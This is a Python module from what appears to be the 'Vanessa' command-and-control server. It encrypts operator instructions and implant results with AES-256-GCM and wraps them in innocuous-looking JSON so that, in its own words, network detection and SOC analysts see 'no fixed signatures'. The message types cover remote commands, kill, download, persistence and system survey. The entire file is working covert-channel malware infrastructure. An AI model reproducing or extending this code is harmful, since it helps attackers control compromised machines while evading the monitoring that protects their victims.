"""
Stealth Protocol Encoding for Vanessa C2 Server.
Mirrors client/utils/encoding.go for cross-language compatibility.

All C2 messages are encoded as normal-looking JSON:
  {"id":"a3f9","d":"<encrypted_base64>","t":1713421830}

Inside "d" (after AES-256-GCM decrypt):
  <2-char type code><pipe-delimited payload>
  Example: "01agent123|instr001|whoami"

To an NDR/SOC, it looks like a JSON webhook response
pasted in a dev Discord/Telegram chat. No fixed signatures.
"""

import base64
import hashlib
import json
import os
import secrets
import time
import logging

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

log = logging.getLogger("vanessa.crypto")

# ── Message type codes ──────────────────────
TYPE_TO_CODE = {
    "INSTRUCTION": "01",
    "RESULT":      "02",
    "CHECKIN":     "03",
    "SWITCH":      "04",
    "SWITCHACK":   "05",
    "SLEEP":       "06",
    "JITTER":      "07",
    "KILL":        "08",
    "DOWNLOAD":    "09",
    "SYSINFO":     "0A",
    "PERSIST":     "0B",
}

CODE_TO_TYPE = {v: k for k, v in TYPE_TO_CODE.items()}


def derive_key(secret: str) -> bytes:
    """Derive a 32-byte AES-256 key from a shared secret using SHA-256.
    Must match Go client's DeriveKey() exactly."""
    return hashlib.sha256(secret.encode()).digest()


def _aes_encrypt(plaintext: bytes, key: bytes) -> bytes:
    """AES-256-GCM encrypt. Returns nonce + ciphertext (includes tag)."""
    gcm = AESGCM(key)
    nonce = os.urandom(12)
    ciphertext = gcm.encrypt(nonce, plaintext, None)
    return nonce + ciphertext


def _aes_decrypt(data: bytes, key: bytes) -> bytes:
    """AES-256-GCM decrypt. Input: nonce + ciphertext."""
    if len(data) < 12:
        raise ValueError("Ciphertext too short")
    nonce = data[:12]
    ciphertext = data[12:]
    gcm = AESGCM(key)
    return gcm.decrypt(nonce, ciphertext, None)


def encode_message(message: str, key: bytes) -> str:
    """Encode a protocol message into a stealth JSON envelope.

    Input:  "INSTRUCTION|agent123|instr001|whoami"
    Output: '{"id":"a3f9","d":"IF1sJ4UU...","t":1713421830}'

    The keyword is replaced with a 2-char type code, encrypted,
    and wrapped in normal-looking JSON. Zero signatures.
    """
    parts = message.split("|", 1)
    keyword = parts[0]

    code = TYPE_TO_CODE.get(keyword, "FF")
    if code == "FF":
        # Unknown type — encode whole message
        inner = "FF" + message
    elif len(parts) == 2:
        inner = code + parts[1]
    else:
        inner = code

    # Encrypt
    encrypted = _aes_encrypt(inner.encode(), key)

    # Use RawStdEncoding (no padding) to match Go's base64.RawStdEncoding
    b64 = base64.b64encode(encrypted).decode().rstrip("=")

    # Wrap in JSON envelope
    envelope = {
        "id": secrets.token_hex(2),   # Random 4-char hex
        "d":  b64,                     # Encrypted payload
        "t":  int(time.time()),        # Unix timestamp
    }

    return json.dumps(envelope, separators=(",", ":"))


def decode_message(message: str, key: bytes) -> str:
    """Decode a stealth JSON message back to original protocol format.

    Input:  '{"id":"a3f9","d":"IF1sJ4UU...","t":1713421830}'
    Output: "INSTRUCTION|agent123|instr001|whoami"

    Backwards compatible:
    - Legacy ENC| messages are handled
    - Non-JSON messages pass through unchanged
    """
    # Try JSON parse
    try:
        envelope = json.loads(message)
    except (json.JSONDecodeError, TypeError):
        # Legacy ENC| format
        if isinstance(message, str) and message.startswith("ENC|"):
            return _decode_legacy(message[4:], key)
        return message

    if not isinstance(envelope, dict) or "d" not in envelope:
        return message

    # Base64 decode (handle missing padding)
    b64_data = envelope["d"]
    padding = 4 - len(b64_data) % 4
    if padding != 4:
        b64_data += "=" * padding

    try:
        encrypted = base64.b64decode(b64_data)
    except Exception:
        return message

    # Decrypt
    try:
        plaintext = _aes_decrypt(encrypted, key)
    except Exception:
        return message  # Wrong key or not ours

    inner = plaintext.decode()
    if len(inner) < 2:
        return message

    # Extract type code and restore keyword
    code = inner[:2]
    payload = inner[2:]

    keyword = CODE_TO_TYPE.get(code)
    if keyword is None:
        if code == "FF":
            return payload
        return message

    if payload:
        return keyword + "|" + payload
    return keyword


def _decode_legacy(encoded: str, key: bytes) -> str:
    """Handle old ENC|<base64> format for backwards compatibility."""
    data = base64.b64decode(encoded)
    plaintext = _aes_decrypt(data, key)
    return plaintext.decode()
